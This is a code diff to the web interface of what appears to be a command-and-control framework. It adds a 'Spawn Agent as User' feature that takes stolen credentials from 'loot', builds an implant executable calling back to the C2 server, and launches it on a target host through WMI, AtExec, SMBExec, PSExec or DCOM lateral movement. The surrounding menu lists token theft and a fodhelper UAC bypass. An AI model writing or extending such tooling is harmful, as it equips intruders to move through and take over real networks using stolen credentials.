@@ -3849,6 +3849,75 @@ async function runCtxAction(act) {
             pollResult(r.data?.task_id, aid);
           }
         });
+      } else if (privAct === 'spawn-as-user') {
+        // Load available payloads for reuse
+        const [artifactR, uploadR] = await Promise.all([api('GET','/api/artifacts'), api('GET','/api/uploads')]);
+        const artifacts   = (artifactR?.ok ? artifactR.data||[] : []).filter(f => f.filename?.match(/\.(exe|bin)$/i));
+        const uploadFiles = (uploadR?.ok  ? uploadR.data||[]  : []).filter(f => f.filename?.match(/\.(exe|bin)$/i) && !f.agent_id);
+        const artifactNames = new Set(artifacts.map(f => f.filename));
+        const payloadItems  = [{v:'', l:'🆕 Build new (auto)'}]
+          .concat(artifacts.map(f=>({v:f.filename,l:f.filename})))
+          .concat(uploadFiles.filter(f=>!artifactNames.has(f.filename)).map(f=>({v:f.filename,l:f.filename})));
+
+        showQuickForm('🚀 Spawn Agent as User', [
+          {type:'cred-pick', key:'credpick', label:'From Loot'},
+          {key:'user',      label:'Username',       def:'', ph:'.\\localuser  /  CORP\\admin'},
+          {key:'pass',      label:'Password',       type:'password', ph:''},
+          {key:'method',    label:'Deploy via',     type:'select', options:[
+            {v:'wmi',     l:'WMI (Win32_Process)'},
+            {v:'atexec',  l:'AtExec (Task Scheduler)'},
+            {v:'smbexec', l:'SMBExec (cmd service)'},
+            {v:'psexec',  l:'PSExec (SCM service)'},
+            {v:'dcom',    l:'DCOM (MMC20)'},
+          ]},
+          {key:'transport', label:'Payload transport', type:'select', options:[
+            {v:'http',  l:'HTTP  (port 8080)'},
+            {v:'https', l:'HTTPS (port 8443)'},
+            {v:'tcp',   l:'TCP   (port 4444)'},
+          ]},
+          {key:'payload',   label:'Payload (exe)',   type:'select', options: payloadItems},
+        ], async vals => {
+          if (!vals.user) { toast('Username required','red'); return; }
+
+          const host = agnt?.ip || '127.0.0.1';
+          let payloadName = vals.payload;
+
+          if (!payloadName) {
+            const suffix = Math.random().toString(16).slice(2,8);
+            const outName = `agent_priv_${suffix}.exe`;
+            const c2host  = c2IPs[0] || (() => { try { return new URL(BASE).hostname; } catch(_){return '127.0.0.1';} })();
+            const transport = vals.transport || 'http';
+            const portMap   = {http:'8080', https:'8443', tcp:'4444'};
+            const scheme    = transport === 'tcp' ? 'tcp' : transport;
+            const serverURL = `${scheme}://${c2host}:${portMap[transport]||'8080'}`;
+            openConsoleFor(aid);
+            addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → ${serverURL}…`, '', null);
+            const buildR = await api('POST', '/api/build', {
+              format:'exe', transport, server_url: serverURL,
+              sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
+              output_name: outName,
+            });
+            if (!buildR?.ok) {
+              addConsoleOutputForAgent(aid,'',`[privesc] ✗ Build failed: ${buildR?.error||'error'}`,null);
+              return;
+            }
+            payloadName = outName;
+            addConsoleOutputForAgent(aid, `[privesc] ✓ Payload ready: ${payloadName}`, '', null);
+          } else {
+            openConsoleFor(aid);
+          }
+
+          // Register watcher so spawned agent inherits parent_id in graph
+          _lateralWatchers[host] = {
+            parentID: aid,
+            knownIds: new Set(agents.map(a => a.id)),
+            expiry:   Date.now() + 300000,
+          };
+
+          const cmdLine = `jump ${vals.method} ${host} ${payloadName} ${vals.user} ${vals.pass}`;
+          addConsoleOutputForAgent(aid, `[privesc] → ${cmdLine}`, '', null);
+          setTimeout(() => dispatchConsoleCmd(aid, cmdLine), 350);
+        });
       } else if (privAct === 'fodhelper') {
         showQuickForm('⬆️ UAC Bypass (fodhelper)', [
           {key:'cmd', label:'Command to elevate', def:'cmd.exe', ph:'cmd.exe'},
@@ -4339,6 +4408,8 @@ function agentContextMenu(e, agentId) {
       {label:'SSH…',               action:{fn:'lateralMove', id, method:'ssh'}},
     ]},
     {_sub:'🔐  Privilege Escalation', items:[
+      {label:'🚀 Spawn Agent as User…',     action:{fn:'quickPrivesc', id, act:'spawn-as-user'}},
+      null,
       {label:'Steal SYSTEM token (PID 4)',  action:{fn:'quickPrivesc', id, act:'steal-system'}},
       {label:'Steal token from PID…',      action:{fn:'quickPrivesc', id, act:'steal-pid'}},
       {label:'Make Token…',               action:{fn:'quickPrivesc', id, act:'make-token'}},
